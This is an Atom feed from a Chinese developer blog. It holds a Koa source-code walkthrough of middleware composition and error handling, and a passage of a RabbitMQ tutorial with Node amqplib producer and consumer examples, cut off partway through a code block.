<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>罗峡的技术博客</title>
  
  <subtitle>爱技术，爱生活</subtitle>
  <link href="/code/atom.xml" rel="self"/>
  
  <link href="http://luoxia.me/code/"/>
  <updated>2017-11-16T13:53:48.598Z</updated>
  <id>http://luoxia.me/code/</id>
  
  <author>
    <name>罗峡的博客</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Koa源码解读</title>
    <link href="http://luoxia.me/code/2017/11/16/Koa%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"/>
    <id>http://luoxia.me/code/2017/11/16/Koa源码解读/</id>
    <published>2017-11-16T13:50:58.000Z</published>
    <updated>2017-11-16T13:53:48.598Z</updated>
    
    <content type="html"><![CDATA[<p>阅读<code>koa</code>的源码，发现它真是短小精悍，其中的精髓应该要属基于<code>async</code>的中间件机制和错误处理了。所以我就从这两方面去解读源码。<br><a id="more"></a></p><h2 id="Middleware机制"><a href="#Middleware机制" class="headerlink" title="Middleware机制"></a>Middleware机制</h2><p>首先在<code>Application</code>类的构造函数内部初始化对象的<code>middleware</code>属性为空数组（空栈）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.proxy = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.middleware = [];</span><br><span class="line">    <span class="keyword">this</span>.subdomainOffset = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">this</span>.env = process.env.NODE_ENV || <span class="string">'development'</span>;</span><br><span class="line">    <span class="keyword">this</span>.context = <span class="built_in">Object</span>.create(context);</span><br><span class="line">    <span class="keyword">this</span>.request = <span class="built_in">Object</span>.create(request);</span><br><span class="line">    <span class="keyword">this</span>.response = <span class="built_in">Object</span>.create(response);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当调用<code>use()</code>方法时，压入新的中间件函数到<code>middleware</code>栈顶:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use(fn) &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">this</span>.middleware.push(fn);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="执行中间件："><a href="#执行中间件：" class="headerlink" title="执行中间件："></a>执行中间件：</h3><p>一切的一切从<code>listen()</code>开始:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">listen(...args) &#123;</span><br><span class="line">    debug(<span class="string">'listen'</span>);</span><br><span class="line">    <span class="keyword">const</span> server = http.createServer(<span class="keyword">this</span>.callback());</span><br><span class="line">    <span class="keyword">return</span> server.listen(...args);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// callback():</span></span><br><span class="line"> callback() &#123;</span><br><span class="line">    <span class="keyword">const</span> fn = compose(<span class="keyword">this</span>.middleware);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.listeners(<span class="string">'error'</span>).length) <span class="keyword">this</span>.on(<span class="string">'error'</span>, <span class="keyword">this</span>.onerror);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> handleRequest = <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> ctx = <span class="keyword">this</span>.createContext(req, res);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.handleRequest(ctx, fn);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handleRequest;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>将中间件栈内的函数转化为原生<code>httpServer</code>能够执行的回调，其逻辑在<code>compose</code>函数里，来自模块<code>koa-compose</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compose</span> (<span class="params">middleware</span>) </span>&#123;</span><br><span class="line"> <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">context, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// last called middleware #</span></span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> dispatch(<span class="number">0</span>)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (i &lt;= index) <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'next() called multiple times'</span>))</span><br><span class="line">      index = i</span><br><span class="line">      <span class="keyword">let</span> fn = middleware[i]</span><br><span class="line">      <span class="keyword">if</span> (i === middleware.length) fn = next</span><br><span class="line">      <span class="keyword">if</span> (!fn) <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve()</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(fn(context, <span class="function"><span class="keyword">function</span> <span class="title">next</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> dispatch(i + <span class="number">1</span>)</span><br><span class="line">        &#125;))</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(err)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从第一个<code>middleware</code>开始，通过<code>Promise.resolve()</code>将<code>async</code>函数转化为<code>Promise</code>对象，同时传入的<code>next</code>函数返回下一个<code>middleware</code>转化后的<code>Promise</code>对象，这样递归进行。</p><p>最终在<code>handleRequest()</code>函数里，创建<code>context</code>，调用<code>this.handleRequest()</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">handleRequest(ctx, fnMiddleware) &#123;</span><br><span class="line">    <span class="keyword">const</span> res = ctx.res;</span><br><span class="line">    res.statusCode = <span class="number">404</span>;</span><br><span class="line">    <span class="keyword">const</span> onerror = <span class="function"><span class="params">err</span> =&gt;</span> ctx.onerror(err);</span><br><span class="line">    <span class="keyword">const</span> handleResponse = <span class="function"><span class="params">()</span> =&gt;</span> respond(ctx);</span><br><span class="line">    onFinished(res, onerror);</span><br><span class="line">    <span class="keyword">return</span> fnMiddleware(ctx).then(handleResponse).catch(onerror);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p> 将<code>context</code>对象传入经过<code>compose()</code>返回的函数，然后这个函数再返回Promise对象，<code>handleRequest()</code>函数再加入了最后的<code>response</code>逻辑和错误处理。</p><p> 最后自己实现一个简单的<code>koa</code>并测试，只包含<code>middleware</code>处理逻辑:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Koa</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.middleware = [];</span><br><span class="line">    &#125;</span><br><span class="line">    listen()&#123;</span><br><span class="line">        <span class="keyword">let</span> cb = <span class="keyword">this</span>.callback();</span><br><span class="line">        cb();</span><br><span class="line">    &#125;</span><br><span class="line">    use(fn)&#123;</span><br><span class="line">        <span class="keyword">this</span>.middleware.push(fn);</span><br><span class="line">    &#125;</span><br><span class="line">    callback()&#123;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">let</span> middleware = <span class="keyword">this</span>.middleware;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (i &lt;= index) <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'next() called multiple times'</span>))</span><br><span class="line">          index = i</span><br><span class="line">          <span class="keyword">let</span> fn = middleware[i]</span><br><span class="line">          <span class="keyword">if</span> (i === middleware.length) fn = next</span><br><span class="line">          <span class="keyword">if</span> (!fn) <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve()</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(fn(<span class="function"><span class="keyword">function</span> <span class="title">next</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">              <span class="keyword">return</span> dispatch(i + <span class="number">1</span>)</span><br><span class="line">            &#125;))</span><br><span class="line">          &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(err)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">async</span> ()=&gt; <span class="keyword">await</span> dispatch(<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ko = <span class="keyword">new</span> Koa();</span><br><span class="line">ko.use(<span class="keyword">async</span> next=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">await</span> next();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">5</span>);</span><br><span class="line">&#125;);</span><br><span class="line">ko.use(<span class="keyword">async</span> next=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">await</span> next();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">4</span>);</span><br><span class="line">&#125;);</span><br><span class="line">ko.use(<span class="keyword">async</span> next=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ko.listen();</span><br></pre></td></tr></table></figure><p>最终输出顺序为<code>1 2 3 4 5</code>，正确运行。</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><h3 id="try-catch"><a href="#try-catch" class="headerlink" title="try...catch"></a><code>try...catch</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">ctx,next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'catched error:'</span>,e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">ctx,next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'some error'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是怎么做到的呢？其实根据上面我们分析的<code>compose</code>模块代码，其实上面的逻辑可以转化为下面的逻辑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(<span class="function">(<span class="params"><span class="keyword">async</span> (</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"some error"</span>);</span><br><span class="line">        &#125;)());</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'error from Promise.resolve()'</span>,e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">handleRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> num1 = <span class="keyword">await</span> <span class="built_in">Promise</span>.resolve(<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">let</span> num2 = <span class="keyword">await</span> getNext();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'错误来了'</span>);</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'catched error:'</span>,e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve(handleRequest());</span><br></pre></td></tr></table></figure><p>最终结果一样。需要注意的是，如果<code>Promise</code>对象本身就进行了<code>catch</code>即<code>Promise.resolve().catch()</code>,那么错误就是由<code>Promise</code>自己处理，在调用它的中间件里就捕获不到该错误了（除非在<code>catch</code>内部再次将错误抛出）。</p><p>关于<code>generator</code>和<code>async</code>混合使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">ge</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'this is generator'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"generator error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">app.use(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">ctx,next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ge();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'catched error:'</span>,e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>发现这样是没法捕获到<code>generator</code>内部的错误的，而在<code>koa1</code>中，中间件函数都为<code>generator</code>，<code>co</code>模块实现了类似于原生<code>async</code>函数的<code>try...catch</code>错误处理机制：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span> *(<span class="params">next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">yield</span> next;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'catched error:'</span>,e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span> *(<span class="params">next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'some error'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>所以最好不要<code>async</code>和<code>generator</code>混用。然后<code>koa2</code>也不建议使用<code>generator</code>中间件函数，并在<code>koa3</code>中取消支持。</p><h3 id="全局错误-onerror"><a href="#全局错误-onerror" class="headerlink" title="全局错误 onerror"></a>全局错误 onerror</h3><p>在前面分析的<code>this.handleRequest()</code>方法内：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> onerror = <span class="function"><span class="params">err</span> =&gt;</span> ctx.onerror(err);</span><br><span class="line"><span class="keyword">const</span> handleResponse = <span class="function"><span class="params">()</span> =&gt;</span> respond(ctx);</span><br><span class="line">onFinished(res, onerror);</span><br><span class="line"><span class="keyword">return</span> fnMiddleware(ctx).then(handleResponse).catch(onerror);</span><br></pre></td></tr></table></figure><p>可以看到，全局处理调用的是<code>ctx.onerror()</code>方法，该方法实现在<code>lib/context.js</code>中，其触发了<code>error</code>事件: <code>this.app.emit(&#39;error&#39;, err, this);</code></p><p>所以，就需要有<code>error</code>事件的<code>listener</code>，在<code>this.callback()</code>方法中，定义了默认的全局错误处理函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.listeners(<span class="string">'error'</span>).length) <span class="keyword">this</span>.on(<span class="string">'error'</span>, <span class="keyword">this</span>.onerror);</span><br></pre></td></tr></table></figure><p>当然最好是自定义：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">ctx,next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"some error"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.on(<span class="string">'error'</span>,e=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">'onerror:'</span>,e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>默认错误代码为<code>500</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;阅读&lt;code&gt;koa&lt;/code&gt;的源码，发现它真是短小精悍，其中的精髓应该要属基于&lt;code&gt;async&lt;/code&gt;的中间件机制和错误处理了。所以我就从这两方面去解读源码。&lt;br&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="Koa" scheme="http://luoxia.me/code/tags/Koa/"/>
    
      <category term="源码" scheme="http://luoxia.me/code/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>RabbitMQ</title>
    <link href="http://luoxia.me/code/2017/09/07/RabbitMQ/"/>
    <id>http://luoxia.me/code/2017/09/07/RabbitMQ/</id>
    <published>2017-09-07T08:15:26.000Z</published>
    <updated>2017-11-16T13:10:06.485Z</updated>
    
    <content type="html"><![CDATA[<p>学习RabbitMQ.以Node client实现为例。</p><p>RabbitMQ是一个由erlang开发的AMQP（Advanced Message Queue ）的开源实现。目前RabbitMQ基于AMQP 0-9-1。</p><p><img src="http://img.blog.csdn.net/20160310091724939" alt="http://img.blog.csdn.net/20160310091724939"></p><a id="more"></a><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>Publisher和Consumer都通过Socket与RabbitMQ server连接，在Consumer与RabbitMQ server的socket连接上，建立Channel,用于多次消息传输，减少开支。每一个Consumer都有维护消息的queue(可以多个Consumer共用)，exchange用于调度消息的发布，一边Publisher发布消息到Exchange,另一边，各个queue与exchange建立联系并表达自己的兴趣，Exchange根据不同type的调度方式，将消息推送到适当的queue，对于声明了相同的queue的consumer，可以并行负载均衡的处理消息。总的来说:</p><ul><li>应用解耦: 两边的程序只需实现相应的接口约定，而不用关心内部细节</li><li>冗余存储器: 可对消息队列和消息进行持久化，一定程度上减少Server突然挂掉带来的数据丢失</li><li>可扩展: 对同一queue，可以起多个consumer并行处理，而且提供负载均衡算法</li><li>消息确认: 提供ack机制，保证消息被正确处理</li><li>顺序和缓冲: 队列机制保证消息处理顺序，缓冲提供性能优化</li><li>异步通信: Publisher发布的消息可以不被立即处理，可在后面动态加入consumer进行处理</li><li>分布式集群: 提供容灾能力和消息吞吐量</li><li>语言无关: 跨语言通信</li></ul><p>作为一种进程间通信的方法，对比Node多进程架构，其IPC通道只是本地的进程间通信，相当于是单机集群。而RabbitMQ通过消息队列的形式完成了IPC（包括本地进程，RPC）。</p><h2 id="简单的queue消息传输"><a href="#简单的queue消息传输" class="headerlink" title="简单的queue消息传输"></a>简单的queue消息传输</h2><p>一个最简单的例子是一个Producer,一个Consumer:</p><p><img src="http://www.rabbitmq.com/img/tutorials/python-one.png" alt="http://www.rabbitmq.com/img/tutorials/python-one.png"></p><p>因此需要为Channel断言一个明确名字的queue，通过往queue上加入消息，consumer进行处理:</p><p><code>client.js (Producer):</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> amqp = <span class="built_in">require</span>(<span class="string">'amqplib'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">client</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> q = <span class="string">'hello'</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">        <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.assertQueue(q,&#123;<span class="attr">durable</span>:<span class="literal">false</span>&#125;); <span class="comment">//非持久化的队列断言</span></span><br><span class="line"></span><br><span class="line">        ch.sendToQueue(q,<span class="keyword">new</span> Buffer(msg));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"client send msg:"</span>,msg);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">await</span> ch.close();</span><br><span class="line">        <span class="keyword">await</span> conn.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> msg = process.argv.slice(<span class="number">2</span>).join(<span class="string">' '</span>) || <span class="string">'hello,world.'</span>;</span><br><span class="line"></span><br><span class="line">client(msg);</span><br></pre></td></tr></table></figure></p><p><code>server.js (Consumer)</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> conn = <span class="keyword">await</span> amqp.connect(<span class="string">'amqp://127.0.0.1'</span>);</span><br><span class="line">        process.once(<span class="string">'SIGINT'</span>,()=&gt;conn.close());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> ch = <span class="keyword">await</span> conn.createChannel();</span><br><span class="line">        <span class="keyword">await</span> ch.assertQueue(<span class="string">'hello'</span>,&#123;<span class="attr">durable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> ch.consume(<span class="string">'hello'</span>,msg=&gt;&#123;</span><br><span class="line">            <span class="keyword">let</span> body = msg.content.toString();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"server recieved:"</span>,body);</span><br><span class="line">        &#125;,&#123;<span class="attr">noAck</span>:<span class="literal">true</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"waiting for massages."</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server();</span><br></pre></td></tr></table></figure></p><h2 id="通过并行-amp-负载均衡的workers处理消息"><a href="#通过并行-amp-负载均衡的workers处理消息" class="headerlink" title="通过并行&amp;负载均衡的workers处理消息"></a>通过并行&amp;负载均衡的workers处理消息</h2><p>对于上面的<code>server.js</code>完全可以起多个实例，这样相当于是运行了多个worker，对于queue里的每一个消息都有多个worker可以选择，从而做到多个worker并行处理多个消息，实现负载均衡:</p><p><img src="http://www.rabbitmq.com/img/tutorials/python-two.png" alt="http://www.rabbitmq.com/img/tutorials/python-two.png"></p><p>在上例基础上修改后的<code>server.js</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 